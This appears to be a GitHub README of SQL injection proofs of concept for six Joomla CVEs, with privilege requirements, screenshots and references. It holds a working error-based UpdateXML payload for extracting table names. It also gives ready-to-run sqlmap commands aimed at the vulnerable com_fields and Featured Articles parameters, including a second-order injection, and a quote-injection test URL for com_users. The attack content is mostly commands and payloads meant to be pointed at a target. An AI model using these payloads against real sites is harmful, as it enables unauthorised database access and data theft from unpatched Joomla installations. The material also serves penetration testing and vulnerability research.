# Joomla-SQLinjection PoC

0. CVE-2020-35613

1. CVE-2020-10243

2. CVE-2019-19846

3. CVE-2018-8045

4. CVE-2018-6376

5. CVE-2017-8917

# Payload to detect prefix table
## Step 1: Get hexa value
*UpdateXML(2, concat(0x3a,(SELECT HEX(MID(TABLE_NAME,1,16)) FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT 1,1), 0x3a), 1)*
## Step 2: Convert hexa to ASCII
+) Linux command: echo "hexa value" | xxd -r -p

+) Link: https://www.rapidtables.com/convert/number/hex-to-ascii.html

# 5. CVE-2017-8917
### User requirement: None
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77494259-ddd35680-6e77-11ea-8331-106c89b48f7c.png)
## Sqlmap:
sqlmap -u "[your taget]/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs
## Example
sqlmap -u "http://192.168.119.128/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs
# 4. CVE-2018-6376
### User requirement: Manager (Lowest level)
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77607304-73d8b100-6f4c-11ea-9c6b-72a56c55efda.png)

### Second-url:

![image](https://user-images.githubusercontent.com/24661746/77607359-a7b3d680-6f4c-11ea-9f66-78b24b5ee895.png)

## 3. CVE-2018-8045
### User requirement: Administrator
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77608547-25c5ac80-6f50-11ea-9495-b13b00448d1c.png)
## 2. CVE-2019-19846
### User requirement: Super Users
## Detecting:
...Update later-...
## 1. CVE-2020-10243: SQL injection in Featured Articles menu parameters
# Author : Sam Thomas, Pentest.co.uk
# PoC by : Hoang Kien
## User requirement: admin (Not superadmin)
## Type: Second Order SQL Injection
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/78954200-8d115e00-7b05-11ea-8cd1-0d605fff4101.png)
## Second-url:
![image](https://user-images.githubusercontent.com/24661746/78954286-d2ce2680-7b05-11ea-9ffb-ec1263618056.png)

## Exploit as video:
https://vimeo.com/398763205
## Sqlmap:
 *sqlmap -r sqli.joomla.req --level=5 --risk=3 -p "jform%5Bparams%5D%5Bfeatured_categories%5D%5B%5D" --dbms=mysql --second-url "[your domain/IP]/index.php" --technique=E --dbs*
## Example:
sqlmap -r sqli.joomla.req --level=5 --risk=3 -p "jform%5Bparams%5D%5Bfeatured_categories%5D%5B%5D" --dbms=mysql --second-url "http://192.168.131.134:8080/index.php" --technique=E --dbs
## 0. CVE-2020-35613 : SQL injection in com_users list view
# Author : ka1n4t
# PoC by : Hoang Kien
## User requirement: admin (Not superadmin)
## Detecting:
[your domain/IP]/administrator/index.php?option=com_users&view=users&filter[excluded]='

![image](https://user-images.githubusercontent.com/24661746/102855478-50994e80-4457-11eb-8d6a-efeb51b9ac96.png)
Reference:

0. https://www.empressia.pl/blog/184-analiza-podatnosci-sql-injection-w-cms-joomla
1. https://pentest.co.uk/labs/advisory/cve-2020-10243/
2. https://xz.aliyun.com/t/6990
3. https://github.com/luckybool1020/CVE-2018-8045
4. https://www.notsosecure.com/analyzing-cve-2018-6376/
5. https://github.com/gottburgm/Exploits/tree/master/CVE-2017-8917
